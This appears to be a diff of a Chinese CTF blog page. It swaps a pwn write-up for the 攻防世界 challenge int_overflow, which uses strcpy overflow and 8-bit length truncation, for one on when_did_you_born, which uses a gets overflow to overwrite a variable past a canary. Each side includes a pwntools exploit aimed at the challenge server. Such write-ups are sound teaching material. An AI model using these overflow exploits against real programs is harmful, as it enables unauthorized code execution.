@@ -6,25 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>攻防世界新手区int_overflow | HandsomeJack</title>
+  <title>攻防世界新手区when_did_you_born | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="[攻防世界]新手区int_overflow这个题，题目提示很明显，往整数溢出方向想先查看文件基本信息，得知是32位程序，且没有canary和PIE然后看看字符串窗口，看有没有可以利用的字符串，发现system和cat flag，且存在一些需要留意的高危函数，strcpy和read。">
+  <meta name="description" content="[攻防世界]新手区when_did_you_born还是先看文件信息及防护措施64位文件用64IDA打开，先看字符串窗口，找可利用的字符串">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界新手区int_overflow">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;index.html">
+<meta property="og:title" content="攻防世界新手区when_did_you_born">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="[攻防世界]新手区int_overflow这个题，题目提示很明显，往整数溢出方向想先查看文件基本信息，得知是32位程序，且没有canary和PIE然后看看字符串窗口，看有没有可以利用的字符串，发现system和cat flag，且存在一些需要留意的高危函数，strcpy和read。">
+<meta property="og:description" content="[攻防世界]新手区when_did_you_born还是先看文件信息及防护措施64位文件用64IDA打开，先看字符串窗口，找可利用的字符串">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;a.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;b.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;c.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;d.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;e.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;f.png">
-<meta property="og:updated_time" content="2020-02-01T03:22:28.945Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;d.png">
+<meta property="og:updated_time" content="2020-02-02T05:38:04.421Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;01&#x2F;int_overflow&#x2F;a.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;02&#x2F;when_did_you_born&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -189,43 +187,42 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-int_overflow" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-when_did_you_born" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界新手区int_overflow
+      攻防世界新手区when_did_you_born
     </h1>
   
 
         
-        <a href="/2020/02/01/int_overflow/" class="archive-article-date">
-  	<time datetime="2020-02-01T02:48:56.302Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-01</time>
+        <a href="/2020/02/02/when_did_you_born/" class="archive-article-date">
+  	<time datetime="2020-02-02T05:35:50.625Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
 </a>
         
       </header>
-<div align="center" class="post-count">字数：794字 | 预计阅读时长：3分钟</div>
+<div align="center" class="post-count">字数：425字 | 预计阅读时长：1分钟</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="攻防世界-新手区int-overflow"><a href="#攻防世界-新手区int-overflow" class="headerlink" title="[攻防世界]新手区int_overflow"></a>[攻防世界]新手区int_overflow</h1><p>这个题，题目提示很明显，往整数溢出方向想<br>先查看文件基本信息，得知是32位程序，且没有canary和PIE<br><img src="a.png" alt="先checksec查看"><br>然后看看字符串窗口，看有没有可以利用的字符串，发现system和cat flag，且存在一些需要留意的高危函数，strcpy和read。</p>
+        <h1 id="攻防世界-新手区when-did-you-born"><a href="#攻防世界-新手区when-did-you-born" class="headerlink" title="[攻防世界]新手区when_did_you_born"></a>[攻防世界]新手区when_did_you_born</h1><p>还是先看文件信息及防护措施<br><img src="a.png" alt="checksec检查文件"><br>64位文件用64IDA打开，先看字符串窗口，找可利用的字符串</p>
 <a id="more"></a>
-<p><img src="b.png" alt=""><br>点进cat flag发现有一个what_is_this函数直接用了system(“cat flag”)，也就是说只要我们想办法调用这个函数，就可以直接拿到flag。<br>接下来需要找漏洞，最好是可以直接覆盖一个返回地址，覆盖成what_is_this函数的地址。<br>main里没有什么可疑点，点进login函数，发现密码给的长度很大，read可以读0x199字节，十进制就是409，谁会用这么长的密码？这个长度很可疑，猜测从这里入手。<br><img src="c.png" alt=""><br>再进入check_passwd看看<br><img src="d.png" alt=""><br>发现限制了密码长度，要求密码长度在(3,8]内，并且还发现有个strcpy(&amp;dest, s)，这个函数里的s就是密码的字符串，dest长度0x14，所以s长度远大于dest，这就会导致栈溢出。</p>
+<p><img src="b.png" alt=""><br>发现main里有system(“cat flag”)，走到这一步的条件是一开始v5不能等于1926，进入else，然后v5又得等于1926，才能执行system(“cat flag”)这一句。<strong>由于开启了canary，所以没法直接覆盖返回地址到system(“cat flag”)</strong>，所以试试利用gets来进行栈溢出，覆盖v5的值，让它在进入else里以后变成1926。<br><img src="c.png" alt=""></p>
 <h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
-<li>正常输入到输入密码的那一步</li>
-<li>绕过密码的长度检测，让dest溢出</li>
-<li>覆盖返回地址，使之变成what_is_this函数的地址</li>
-<li>拿到flag<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2></li>
+<li>输入生日时，随便输一个数字，只要不是1926就行，来达到else中</li>
+<li>利用gets栈溢出，覆盖之前输入的数字，把它变成1926</li>
+<li>执行system(“cat flag”)拿到flag<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2></li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./intoverflow'</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">'what_is_this'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">24</span> + p32(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>) <span class="comment">#ljust可以用a来填充payload到指定长度260</span></span><br><span class="line"><span class="comment">#这一句也能写成这样：payload += 'a'*(260-len(payload))</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">37911</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your username:'</span>,<span class="string">'aaa'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your passwd:'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x00000786</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">31215</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Birth?'</span>,<span class="string">'666'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Name?'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>payload解释：</p>
 <ol>
-<li>‘a’*24：用于使dest溢出，首先dest本身距离edp是0x14，十进制是20<br><img src="e.png" alt=""><br>在覆盖到返回地址的途中，有一次leave操作，<strong>在32位汇编中，leave等价于mov esp,ebp并pop ebp的操作</strong>，也就是说，在覆盖到返回地址之前，还有一次出栈，<strong>所以需要多覆盖一个ebp的长度</strong>，由于是32位，所以是4字节，所以覆盖ebp0x4，十进制是4<br>总和就是’a’*24</li>
-<li>p32(sys_addr)：覆盖返回地址为what_is_this函数的地址，即check_passwd之后直接返回what_is_this函数。</li>
-<li>payload.ljust(260,’a’)：由于程序执行到what_is_this函数后我们可以直接得到flag，所以之后怎么运行就不用管了，直接填充一堆’a’来让payload的长度能通过密码长度检测即可。但是显然payload前两部分的长度就超过了密码检测的最大长度8，这个时候就用到了整数溢出<br><img src="f.png" alt=""><br>v3即为密码的长度，可以看到它是一个长8位的只有正数的整数即00000000~11111111，就是0到255，当给v8赋值超过255时，比如256，即1 0000 0000，<strong>由于v8本身只有8位，所以超过8位的，就会发生高位截断，只会保留低位</strong>，所以这个1会被舍弃，v8的值就是0000 0000，而给v8赋值257，它的值就是1，赋值258，它的值就是2。所以只要让payload的长度在(259,264]内，就能让v8的值在(3,8]内，才能通过密码长度检测。</li>
+<li>‘a’*8：看栈算v20和v18的距离，这里v20就是v5，v18就是v4<br><img src="d.png" alt=""><br>地址0x00000020和0x00000018之间距离为8，所以填充8个’a’</li>
+<li>p64(0x00000786)：1926的16进制值，用于覆盖之前输入的’666’</li>
 </ol>
+<h2 id="关于canary："><a href="#关于canary：" class="headerlink" title="关于canary："></a>关于canary：</h2><p>开了canary后，就会在返回地址之前放一个值，如果想要覆盖返回地址到指定位置，那么就不得不先覆盖掉这个值，但是canary保护会检查这个值是否被改写，如果和以前的值不一样，那么程序会直接终止，要用一些其他方法来绕过或者利canary本身弱点来攻击。所以<strong>开启canary后，不能直接覆盖返回地址到指定位置</strong>，但是这道题可以直接覆盖v5的值来拿到flag，不用将返回地址覆盖到system。</p>
 
       
 
@@ -321,7 +318,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/01/int_overflow/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/02/when_did_you_born/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -335,18 +332,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/02/02/cgpwn2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          攻防世界新手区cgpwn2
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/01/31/level2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">攻防世界新手区level2</div>
+    <a href="/2020/02/02/cgpwn2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界新手区cgpwn2</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -373,7 +361,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区int-overflow"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区int_overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区when-did-you-born"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区when_did_you_born</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于canary："><span class="toc-number">1.3.</span> <span class="toc-text">关于canary：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -398,7 +386,7 @@
 <script src="https://billts.site/js/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://yoursite.com/2020/02/01/int_overflow/",
+  id: "http://yoursite.com/2020/02/02/when_did_you_born/",
   owner: 'SpHandsomeJack',
   repo: 'gitment-comment',
   oauth: {
